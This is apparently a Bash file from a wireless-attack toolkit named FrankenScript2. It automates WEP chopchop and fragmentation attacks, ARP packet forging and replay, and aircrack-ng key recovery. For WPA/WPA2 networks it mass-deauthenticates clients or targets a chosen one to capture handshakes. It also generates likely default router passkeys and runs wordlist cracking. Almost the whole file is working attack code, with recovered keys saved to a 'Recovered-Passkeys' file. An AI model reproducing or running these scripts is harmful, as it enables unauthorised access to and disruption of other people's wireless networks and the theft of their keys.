Aireplay_Association_Check=$(grep "Association successful :-)" $HOME/FrankenScript2/Temp_Working_Dirctory/Aireplay_Association_Check.txt)
if [[ $Aireplay_Association_Check ]]; then
   clear
   echo "Association was successful"
   sleep 5
   Chopchop
else
   read -p $GREEN"Press $RED[Enter]$GREEN to finish."$STAND
   Attack_Detection_And_Options
fi
}

Chopchop(){
clear
echo "Starting Chopchop"

if [ "$(pidof airodump-ng)" ] 
then
   killall airodump-ng
fi

xterm -geometry 100x28+0+500 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Chopchop_Check.txt -e "yes | aireplay-ng -4 -e $AP_essid -b $AP_bssid -h $mon0mac --ignore-negative-one mon0"

sleep 5

Chopchop_Check=$(grep "Saving keystream" $HOME/FrankenScript2/Temp_Working_Dirctory/Chopchop_Check.txt)
if [[ $Chopchop_Check ]]; then
   clear
   echo "Chopchop was successful"
   sleep 5
   Packetforge
else
   read -p $GREEN"Press $RED[Enter]$GREEN to finish."$STAND
fi
}

Packetforge(){
clear
echo "Starting Packetforge"

xterm -geometry 100x28+0+500 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Packetforge_Check.txt -e "packetforge-ng -0 -a $AP_bssid -h $mon0mac -k 255.255.255.255 -l 255.255.255.255 -y $HOME/FrankenScript2/Temp_Working_Dirctory/*.xor -w $HOME/FrankenScript2/Temp_Working_Dirctory/forged-arp-packet mon0"

sleep 2
clear

Packetforge_Check=$(grep "Wrote packet to:" $HOME/FrankenScript2/Temp_Working_Dirctory/Packetforge_Check.txt)
if [[ $Packetforge_Check ]]; then
   clear
   echo "Packetforge was successful"
   sleep 5
   Airodump
else
   read -p $GREEN"Press $RED[Enter]$GREEN to finish."$STAND
   Attack_Detection_And_Options
fi
}

Airodump(){
xterm -geometry 100x16+675+255 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Check.txt -e "airodump-ng -c $AP_channel --ignore-negative-one -w $HOME/FrankenScript2/Temp_Working_Dirctory/wep --bssid $AP_bssid mon0" &

sleep 5
clear

Airodump_Check=$(grep $AP_essid $HOME/FrankenScript2/Temp_Working_Dirctory/*.netxml)
if [[ $Airodump_Check ]]; then
   clear
   echo $RED"The access point was detected."$STAND
   sleep 5
   Interactive
else
   echo $RED"The access point wasn't detected, re-checking in 5 seconds..."$STAND
   sleep 5
   Airodump_Check=$(grep $AP_essid $HOME/FrankenScript2/Temp_Working_Dirctory/*.netxml)
   if [[ $Airodump_Check ]]; then
      clear
      echo $RED"The access point was detected."$STAND
      sleep 5
      Interactive
   else
      echo $RED"The access point wasn't detected, re-checking in 5 seconds..."$STAND
      sleep 5
      Airodump_Check=$(grep $AP_essid $HOME/FrankenScript2/Temp_Working_Dirctory/*.netxml)
      if [[ $Airodump_Check ]]; then
         clear
         echo $RED"The access point was detected."$STAND
         sleep 5
         Interactive
      else
         if [ "$(pidof airodump-ng)" ] 
         then
            killall airodump-ng
         fi
         read -p $GREEN"Press $RED[Enter]$GREEN to finish."$STAND
         Attack_Detection_And_Options
      fi
   fi
fi
}

Interactive(){
clear
echo "Starting Interactive"

xterm -geometry 100x12+675+500 -e "aireplay-ng -2 -h $mon0mac -F -r $HOME/FrankenScript2/Temp_Working_Dirctory/forged-arp-packet --ignore-negative-one mon0" &

echo "Waiting 15 seconds before checking if the attack is successful"
sleep 15

Airodump_Data_Count_Check=$(tac $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Check.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
if [[ $Airodump_Data_Count_Check ]]; then
   clear
   echo "The data is rising so the attack appears to be successful, proceeding to Aircrack in 10 seconds..."
   sleep 10
   Aircrack
else
   echo $RED"Re-checking in 10 seconds..."$STAND
   sleep 10
   Airodump_Data_Count_Check=$(tac $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Check.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
   if [[ $Airodump_Data_Count_Check ]]; then
      clear
      echo "The data is rising so the attack appears to be successful, proceeding to Aircrack in 10 seconds..."
      sleep 10
      Aircrack
   else
      echo $RED"Re-checking in 10 seconds..."$STAND
      sleep 10
      Airodump_Data_Count_Check=$(tac $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Check.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
      if [[ $Airodump_Data_Count_Check ]]; then
         clear
         echo "The data is rising so the attack appears to be successful, proceeding to Aircrack in 10 seconds..."
         sleep 10
         Aircrack
      else
         if [ "$(pidof airodump-ng)" ] 
         then
            killall airodump-ng
         fi

         if [ "$(pidof aireplay-ng)" ] 
         then
            killall aireplay-ng
         fi
         read -p $GREEN"Press $RED[Enter]$GREEN to finish."$STAND
         Attack_Detection_And_Options
      fi
   fi
fi
}

Aircrack(){
clear

xterm -geometry 100x25+0+400 -e "aircrack-ng -b $AP_bssid $HOME/FrankenScript2/Temp_Working_Dirctory/*.cap -l $HOME/FrankenScript2/Temp_Working_Dirctory/WEPpasskey.txt"

if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/WEPpasskey.txt ]]; then
   passkey=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/WEPpasskey.txt)
   clear
   echo AP ESSID: $AP_essid >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   echo AP BSSID: $AP_bssid >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   echo WEP Passkey: $passkey >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   echo ' ' >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   if [ "$(pidof airodump-ng)" ] 
   then
      killall airodump-ng
   fi

   if [ "$(pidof aireplay-ng)" ] 
   then
      killall aireplay-ng
   fi

   clear
   echo $RED"Target Passkey$STAND: $passkey"
   echo "The recovered passkey has been saved in $HOME/FrankenScript2/Recovered-Passkeys.txt"
   read -p $GREEN"Press [Enter] to finish$STAND"
   Attack_Detection_And_Options
else
   echo "Aircrack failed"
   read -p $GREEN"Press [Enter] to finish$STAND"

   if [ "$(pidof airodump-ng)" ] 
   then
      killall airodump-ng
   fi

   if [ "$(pidof aireplay-ng)" ] 
   then
      killall aireplay-ng
   fi

   Attack_Detection_And_Options
fi
}

cd $HOME/FrankenScript2/Temp_Working_Dirctory

MAC_Address_Options

AP_essid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $1 }')
AP_bssid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $4 }')
AP_channel=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $5 }')
mon0mac=$(macchanger -s mon0 | grep Current | awk '{ print $3 }')

xterm -geometry 0x0+0+0 -e "airodump-ng -c $AP_channel --bssid $AP_bssid --ignore-negative-one mon0" &

Attempt_Association

Attack_Detection_And_Options
}

WEP_Fragment_With_Association(){
Attempt_Association(){
clear
echo "Attempting Association"
sleep 2

xterm -geometry 100x12+675+500 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Aireplay_Association_Check.txt -e "aireplay-ng -1 0 -a $AP_bssid -h $mon0mac -e $AP_essid --ignore-negative-one mon0"

sleep 2
clear

Aireplay_Association_Check=$(grep "Association successful :-)" $HOME/FrankenScript2/Temp_Working_Dirctory/Aireplay_Association_Check.txt)
if [[ $Aireplay_Association_Check ]]; then
   clear
   echo "Association was successful"
   sleep 5
   Fragment
else
   read -p $GREEN"Press $RED[Enter]$GREEN to finish."$STAND
   Attack_Detection_And_Options
fi
}

Fragment(){
clear
echo "Starting Fragment"

if [ "$(pidof airodump-ng)" ] 
then
   killall airodump-ng
fi

xterm -geometry 100x12+675+500 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Aireplay_Fragment_Check.txt -e "yes | aireplay-ng -5 -F -b $AP_bssid -h $mon0mac --ignore-negative-one mon0"

sleep 5

Fragment_Check=$(grep "Now you can build a packet with packetforge-ng" $HOME/FrankenScript2/Temp_Working_Dirctory/Aireplay_Fragment_Check.txt)
if [[ $Fragment_Check ]]; then
   clear
   echo "Fragment was successful"
   sleep 5
   Packetforge
else
   read -p $GREEN"Press $RED[Enter]$GREEN to finish."$STAND
fi
}

Packetforge(){
clear
echo "Starting Packetforge"

xterm -geometry 100x28+0+500 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Packetforge_Check.txt -e "packetforge-ng -0 -a $AP_bssid -h $mon0mac -k 255.255.255.255 -l 255.255.255.255 -y $HOME/FrankenScript2/Temp_Working_Dirctory/*.xor -w $HOME/FrankenScript2/Temp_Working_Dirctory/forged-arp-packet mon0"

sleep 2
clear

Packetforge_Check=$(grep "Wrote packet to:" $HOME/FrankenScript2/Temp_Working_Dirctory/Packetforge_Check.txt)
if [[ $Packetforge_Check ]]; then
   clear
   echo "Packetforge was successful"
   sleep 5
   Airodump
else
   read -p $GREEN"Press $RED[Enter]$GREEN to finish."$STAND
   Attack_Detection_And_Options
fi
}

Airodump(){
xterm -geometry 100x16+675+255 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Check.txt -e "airodump-ng -c $AP_channel --ignore-negative-one -w $HOME/FrankenScript2/Temp_Working_Dirctory/wep --bssid $AP_bssid mon0" &

sleep 5
clear

Airodump_Check=$(grep $AP_essid $HOME/FrankenScript2/Temp_Working_Dirctory/*.netxml)
if [[ $Airodump_Check ]]; then
   clear
   echo $RED"The access point was detected."$STAND
   sleep 5
   Interactive
else
   echo $RED"The access point wasn't detected, re-checking in 5 seconds..."$STAND
   sleep 5
   Airodump_Check=$(grep $AP_essid $HOME/FrankenScript2/Temp_Working_Dirctory/*.netxml)
   if [[ $Airodump_Check ]]; then
      clear
      echo $RED"The access point was detected."$STAND
      sleep 5
      Interactive
   else
      echo $RED"The access point wasn't detected, re-checking in 5 seconds..."$STAND
      sleep 5
      Airodump_Check=$(grep $AP_essid $HOME/FrankenScript2/Temp_Working_Dirctory/*.netxml)
      if [[ $Airodump_Check ]]; then
         clear
         echo $RED"The access point was detected."$STAND
         sleep 5
         Interactive
      else
         if [ "$(pidof airodump-ng)" ] 
         then
            killall airodump-ng
         fi
         read -p $GREEN"Press $RED[Enter]$GREEN to finish."$STAND
         Attack_Detection_And_Options
      fi
   fi
fi
}

Interactive(){
clear
echo "Starting Interactive"

xterm -geometry 100x12+675+500 -e "aireplay-ng -2 -h $mon0mac -F -r $HOME/FrankenScript2/Temp_Working_Dirctory/forged-arp-packet --ignore-negative-one mon0" &

echo "Waiting 15 seconds before checking if the attack is successful"
sleep 15

Airodump_Data_Count_Check=$(tac $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Check.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
if [[ $Airodump_Data_Count_Check ]]; then
   clear
   echo "The data is rising so the attack appears to be successful, proceeding to Aircrack in 10 seconds..."
   sleep 10
   Aircrack
else
   echo $RED"Re-checking in 10 seconds..."$STAND
   sleep 10
   Airodump_Data_Count_Check=$(tac $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Check.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
   if [[ $Airodump_Data_Count_Check ]]; then
      clear
      echo "The data is rising so the attack appears to be successful, proceeding to Aircrack in 10 seconds..."
      sleep 10
      Aircrack
   else
      echo $RED"Re-checking in 10 seconds..."$STAND
      sleep 10
      Airodump_Data_Count_Check=$(tac $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Check.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
      if [[ $Airodump_Data_Count_Check ]]; then
         clear
         echo "The data is rising so the attack appears to be successful, proceeding to Aircrack in 10 seconds..."
         sleep 10
         Aircrack
      else
         if [ "$(pidof airodump-ng)" ] 
         then
            killall airodump-ng
         fi

         if [ "$(pidof aireplay-ng)" ] 
         then
            killall aireplay-ng
         fi
         read -p $GREEN"Press $RED[Enter]$GREEN to finish."$STAND
         Attack_Detection_And_Options
      fi
   fi
fi
}

Aircrack(){
clear

xterm -geometry 100x25+0+400 -e "aircrack-ng -b $AP_bssid $HOME/FrankenScript2/Temp_Working_Dirctory/*.cap -l $HOME/FrankenScript2/Temp_Working_Dirctory/WEPpasskey.txt"

if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/WEPpasskey.txt ]]; then
   passkey=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/WEPpasskey.txt)
   clear
   echo AP ESSID: $AP_essid >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   echo AP BSSID: $AP_bssid >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   echo WEP Passkey: $passkey >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   echo ' ' >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   if [ "$(pidof airodump-ng)" ] 
   then
      killall airodump-ng
   fi

   if [ "$(pidof aireplay-ng)" ] 
   then
      killall aireplay-ng
   fi

   clear
   echo $RED"Target Passkey$STAND: $passkey"
   echo "The recovered passkey has been saved in $HOME/FrankenScript2/Recovered-Passkeys.txt"
   read -p $GREEN"Press [Enter] to finish$STAND"
   Attack_Detection_And_Options
else
   echo "Aircrack failed"
   read -p $GREEN"Press [Enter] to finish$STAND"

   if [ "$(pidof airodump-ng)" ] 
   then
      killall airodump-ng
   fi

   if [ "$(pidof aireplay-ng)" ] 
   then
      killall aireplay-ng
   fi

   Attack_Detection_And_Options
fi
}

cd $HOME/FrankenScript2/Temp_Working_Dirctory

MAC_Address_Options

AP_essid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $1 }')
AP_bssid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $4 }')
AP_channel=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $5 }')
mon0mac=$(macchanger -s mon0 | grep Current | awk '{ print $3 }')

xterm -geometry 0x0+0+0 -e "airodump-ng -c $AP_channel --bssid $AP_bssid --ignore-negative-one mon0" &

Attempt_Association

Attack_Detection_And_Options
}

WPA_WPA2_Attacks(){
Airodump_Capture(){

if [ "$(pidof airodump-ng)" ] 
then
   killall airodump-ng
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Check.txt &> /dev/null
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/*.csv &> /dev/null
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/*.netxml &> /dev/null
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/*.cap &> /dev/null
fi

sleep 2

if [ "$(pidof airodump-ng)" ] 
then
   echo ""
else
   xterm -geometry 100x20+650+0 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Check.txt -e airodump-ng -c $AP_channel -w $HOME/FrankenScript2/Temp_Working_Dirctory/psk --bssid $AP_bssid --ignore-negative-one mon0 &
fi

Deauthentication_Options
}

Deauthentication_Options(){

clear
echo $RED"ATTACK METHOD - HANDSHAKE CAPTURE"
echo "#################################"$STAND
echo ""
echo "NOTE: Wait for clients to be visable in airodump before entering option [2]."
echo ""
echo $GREEN"[1]$BLUE = Deauthenticate all connected clients."$STAND
echo $GREEN"[2]$BLUE = Deauthenticate a specific client."$STAND
echo $GREEN"[3]$BLUE = Return To Scanned APs.$STAND"
read -p $GREEN"Please choose an option:$STAND " Deauth_Options

if [[ $Deauth_Options == "1" ]]; then
   Deauthenticate_all_connected_clients
fi

if [[ $Deauth_Options == "2" ]]; then
   Deauthenticate_a_specific_client
fi

if [[ $Deauth_Options == "3" ]]; then
   if [ "$(pidof airodump-ng)" ] 
   then
      killall airodump-ng
   fi
   Scanned_APs
fi
}

Deauthenticate_all_connected_clients(){
clear
read -p $GREEN"Input the amount of deauthetication requests to send, or [r] to return to Deauthentication Options:$STAND " deauthetication_requests

if [[ $deauthetication_requests == "r" ]]; then
   Deauthentication_Options
fi

aireplay-ng -0 $deauthetication_requests -a $AP_bssid --ignore-negative-one mon0

clear
echo "Checking for a captured handshake in 5 seconds..."
sleep 5
Handshake_Check=$(grep handshake $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Check.txt)
if [[ $Handshake_Check ]]; then
   Valid_Handshake_Check
else
   echo "Handshake wasn't detected, re-checking in 5 seconds..."
   sleep 5
   Handshake_Check=$(grep handshake $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Check.txt)
   if [[ $Handshake_Check ]]; then
      Valid_Handshake_Check
   else
      echo "Handshake wasn't detected, re-checking in 5 seconds..."
      sleep 5
      Handshake_Check=$(grep handshake $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Check.txt)
      if [[ $Handshake_Check ]]; then
         Valid_Handshake_Check
      else
         echo "Handshake wasn't detected, re-checking in 5 seconds..."
         sleep 5
         Handshake_Check=$(grep handshake $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Check.txt)
         if [[ $Handshake_Check ]]; then
            Valid_Handshake_Check
         else
            echo "Handshake wasn't detected, re-checking in 5 seconds..."
            sleep 5
            Handshake_Check=$(grep handshake $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Check.txt)
            if [[ $Handshake_Check ]]; then
               Valid_Handshake_Check
            else
               echo "Handshake wasn't detected, re-checking in 10 seconds..."
               sleep 10
               Handshake_Check=$(grep handshake $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Check.txt)
               if [[ $Handshake_Check ]]; then
                  Valid_Handshake_Check
               else
                  echo "Handshake wasn't detected"
                  sleep 5
                  Deauthenticate_all_connected_clients
               fi
            fi
         fi
      fi
   fi
fi
}

Deauthenticate_a_specific_client(){

grep "<client-mac>" $HOME/FrankenScript2/Temp_Working_Dirctory/*.netxml | sed -e 's/<client-mac>//g' -e 's/<\/client-mac>//g' -e 's/^[ \t]*//;s/[ \t]*$//' > $HOME/FrankenScript2/Temp_Working_Dirctory/ClientMACs.txt

ClientMACs_Check=$(grep : $HOME/FrankenScript2/Temp_Working_Dirctory/ClientMACs.txt)
if [[ $ClientMACs_Check ]]; then
   cat $HOME/FrankenScript2/Temp_Working_Dirctory/ClientMACs.txt | nl -ba -w 1  -s ': ' > $HOME/FrankenScript2/Temp_Working_Dirctory/ConnectedClientsScan.txt
   ConnectedClientsScan=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/ConnectedClientsScan.txt)
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/ConnectedClientsScan.txt
fi

clear
echo $RED"Please choose a client MAC address"$STAND
echo ""
echo "$ConnectedClientsScan"
echo ""
read -p $GREEN"Input the number of your chosen client MAC address, or [r] to return to Deauthentication Options$STAND " Chosen_Client
echo ""

if [[ $Chosen_Client == "r" ]]; then
   Deauthentication_Options
fi

Chosen_Client_MAC=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/ClientMACs.txt | sed -n ""$Chosen_Client"p")

clear
read -p $GREEN"Input the amount of deauthetication requests to send:$STAND " deauthetication_requests

xterm -geometry 100x20+675+350 -e  "aireplay-ng -0 $deauthetication_requests -a $AP_bssid -c $Chosen_Client_MAC --ignore-negative-one mon0"

clear
echo "Checking for a captured handshake in 5 seconds..."
sleep 5
Handshake_Check=$(grep handshake $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Check.txt)
if [[ $Handshake_Check ]]; then
   Valid_Handshake_Check
else
   echo "Handshake wasn't detected, re-checking in 5 seconds..."
   sleep 5
   Handshake_Check=$(grep handshake $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Check.txt)
   if [[ $Handshake_Check ]]; then
      Valid_Handshake_Check
   else
      echo "Handshake wasn't detected, re-checking in 5 seconds..."
      sleep 5
      Handshake_Check=$(grep handshake $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Check.txt)
      if [[ $Handshake_Check ]]; then
         Valid_Handshake_Check
      else
         echo "Handshake wasn't detected, re-checking in 5 seconds..."
         sleep 5
         Handshake_Check=$(grep handshake $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Check.txt)
         if [[ $Handshake_Check ]]; then
            Valid_Handshake_Check
         else
            echo "Handshake wasn't detected, re-checking in 5 seconds..."
            sleep 5
            Handshake_Check=$(grep handshake $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Check.txt)
            if [[ $Handshake_Check ]]; then
               Valid_Handshake_Check
            else
               echo "Handshake wasn't detected, re-checking in 10 seconds..."
               sleep 10
               Handshake_Check=$(grep handshake $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Check.txt)
               if [[ $Handshake_Check ]]; then
                  Valid_Handshake_Check
               else
                  echo "Handshake wasn't detected"
                  sleep 5
                  Deauthenticate_a_specific_client
               fi
            fi
         fi
      fi
   fi
fi
}

Valid_Handshake_Check(){

if [ "$(pidof airodump-ng)" ] 
then
  killall airodump-ng
fi

rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Check.txt &> /dev/null
rm $HOME/FrankenScript2/Temp_Working_Dirctory/Check_For_A_Valid_Handshake.txt &> /dev/null

sleep 2
pyrit -r $HOME/FrankenScript2/Temp_Working_Dirctory/*.cap -o $HOME/FrankenScript2/Temp_Working_Dirctory/Stripped.cap strip
pyrit -r $HOME/FrankenScript2/Temp_Working_Dirctory/Stripped.cap analyze > $HOME/FrankenScript2/Temp_Working_Dirctory/Check_For_A_Valid_Handshake.txt
sleep 2

Check_For_A_Valid_Handshake=$(grep -e good -e workable $HOME/FrankenScript2/Temp_Working_Dirctory/Check_For_A_Valid_Handshake.txt)
if [[ $Check_For_A_Valid_Handshake ]]; then
   echo ""
   echo $RED"Valid handshake detected,$STAND $AP_essid.cap$RED will be coppied to$STAND FrankenScript2/Captured_Handshakes"
   echo ""
   read -p $GREEN"Press $RED[Enter]$GREEN to continue."$STAND
   cp $HOME/FrankenScript2/Temp_Working_Dirctory/Stripped.cap $HOME/FrankenScript2/Captured_Handshakes/$AP_essid.cap
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/*.csv
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/*.netxml
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/*.cap
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/Check_For_A_Valid_Handshake.txt
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt

   Scanned_APs
else
   echo ""
   echo $RED"No valid handshake detected."$STAND
   echo ""
   read -p $GREEN"Press $RED[Enter]$GREEN to continue."$STAND
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/*.csv
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/*.netxml
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/*.cap
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/Check_For_A_Valid_Handshake.txt

   Airodump_Capture
fi
}

AP_essid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $1 }')
AP_bssid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $4 }')
AP_channel=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $5 }')

MAC_Address_Options

Airodump_Capture
}

AP_Default_Passkey_Keygens(){
clear
echo $RED"Checking for possible default passkey's, please wait..."$STAND
essid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $1 }')
bssid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $5 }')

$HOME/FrankenScript2/Scripts/routerkeygen -s $essid -m $bssid -q --no-gui > $HOME/FrankenScript2/Temp_Working_Dirctory/Possible_Default_Passkey_Generation.txt

Thomson_O2wireless_Check=$(grep -e Thomson -e O2wireless $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt)
if [[ $Thomson_O2wireless_Check ]]; then
   clear
   echo $RED"Checking for possible default passkey's, please wait..."$STAND
   python $HOME/FrankenScript2/Scripts/Thomson_O2wireless.py $essid 2012 >> $HOME/FrankenScript2/Temp_Working_Dirctory/Possible_Default_Passkey_Generation.txt
fi

Belkin_Check=$(grep -e Belkin -e belkin $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $5 }')
if [[ $Belkin_Check ]]; then
   clear
   echo $RED"Checking for possible default passkey's, please wait..."$STAND
   python $HOME/FrankenScript2/Scripts/belkin4xx.py -b $Belkin_Check -e Belkin.c0de >> $HOME/FrankenScript2/Temp_Working_Dirctory/Possible_Default_Passkey_Generation.txt
fi

sed -i '/Testing/d' $HOME/FrankenScript2/Temp_Working_Dirctory/Possible_Default_Passkey_Generation.txt
sed -i '/interrupt/d' $HOME/FrankenScript2/Temp_Working_Dirctory/Possible_Default_Passkey_Generation.txt
sed -i '/Generating/d' $HOME/FrankenScript2/Temp_Working_Dirctory/Possible_Default_Passkey_Generation.txt
sed -i '/match/d' $HOME/FrankenScript2/Temp_Working_Dirctory/Possible_Default_Passkey_Generation.txt
cat $HOME/FrankenScript2/Temp_Working_Dirctory/Possible_Default_Passkey_Generation.txt | rev | awk '{ print $1 }' | rev | sort | uniq > $HOME/FrankenScript2/Temp_Working_Dirctory/Possible_Default_Passkeys.txt
rm $HOME/FrankenScript2/Temp_Working_Dirctory/Possible_Default_Passkey_Generation.txt

if [ -s $HOME/FrankenScript2/Temp_Working_Dirctory/Possible_Default_Passkeys.txt ]
then
   Possible_Default_Passkeys=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Possible_Default_Passkeys.txt)
   Network_essid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $1 }')
   echo ""
   echo $RED"Possible Default Passkeys For$STAND $Network_essid:"
   echo $STAND"$Possible_Default_Passkeys"$STAND
   echo ""
   echo $RED"Possible passkeys have been coppied to:$STAND $HOME/FrankenScript2/APs_Possible_Passkeys/$Network_essid.txt"
   echo Possible Default Passkeys For $Network_essid: > $HOME/FrankenScript2/APs_Possible_Passkeys/$Network_essid.txt
   echo $Possible_Default_Passkeys >> $HOME/FrankenScript2/APs_Possible_Passkeys/$Network_essid.txt
   echo ""
   read -p $GREEN"Press $RED[Enter]$GREEN to continue."$STAND
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/Possible_Default_Passkeys.txt
else
   echo ""
   echo $RED"No Default Passkeys Were Found"$STAND
   echo ""
   read -p $GREEN"Press $RED[Enter]$GREEN to continue."$STAND
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/Possible_Default_Passkeys.txt
fi
}

Attack_Handshake_File(){
clear
echo "$GREEN[1]$BLUE = Wordlist + Pyrit + Cowpatty $RED(Non-Resumable)."$STAND
echo "$GREEN[2]$BLUE = Passthrough Attack $RED(Resumable)."$STAND
read -p $GREEN"Please choose an option?:$STAND " Handshake_Attack_Method

if [[ $Handshake_Attack_Method == "1" ]]; then
   ls -l $HOME/FrankenScript2/Captured_Handshakes | grep .cap | rev | awk '{ print $1 }' | rev > $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Chosen_capture_file.txt
   Presented_Capture_Files=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Chosen_capture_file.txt | nl -ba -w 1 -s ': ')

   clear
   echo $RED"Available Capture Files."
   echo "########################"$STAND
   echo ""
   echo "$Presented_Capture_Files"
   echo ""
   read -p $GREEN"Please input the number of your chosen capture file:$STAND " grep_Line_Number
   cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Chosen_capture_file.txt | sed -n ""$grep_Line_Number"p" > $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_File.txt
   echo ""
   read -p $GREEN"Drag and drop the wordlist onto this screen$STAND: " WordlistNameLocation
   echo ""
   echo $RED"NOTE: If the passkey is found there will be a long wait before the xterm windows close automatically."$STAND
   echo $RED"Recovered passkeys will be stored in$STAND $HOME/FrankenScript2/Recovered-Passkeys.txt"$STAND
   echo ""
   read -p $GREEN"Press $RED[Enter]$GREEN to continue."$STAND

   echo $WordlistNameLocation > $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/WordlistNameLocation.txt
   sed -i "s/'//g" $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/WordlistNameLocation.txt

   Capture_File=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Chosen_capture_file.txt | sed -n ""$grep_Line_Number"p")
   cp $HOME/FrankenScript2/Captured_Handshakes/$Capture_File $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/$Capture_File

   xterm -geometry 75x12+850+0 -e "$HOME/FrankenScript2/Scripts/Handshake_Cracking_Using_A_Wordlist1.sh" &
   xterm -geometry 75x12+850+220 -e "$HOME/FrankenScript2/Scripts/Handshake_Cracking_Using_A_Wordlist2.sh" &
fi

if [[ $Handshake_Attack_Method == "2" ]]; then
   clear
   echo "$GREEN[1]$BLUE = Start A New Attack."$STAND
   echo "$GREEN[2]$BLUE = Resume an attack."$STAND
   read -p $GREEN"Please choose an option?:$STAND " Handshake_Attack_Options

   if [[ $Handshake_Attack_Options == "1" ]]; then
      ls -l $HOME/FrankenScript2/Captured_Handshakes | grep .cap | rev | awk '{ print $1 }' | rev > $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Chosen_capture_file.txt
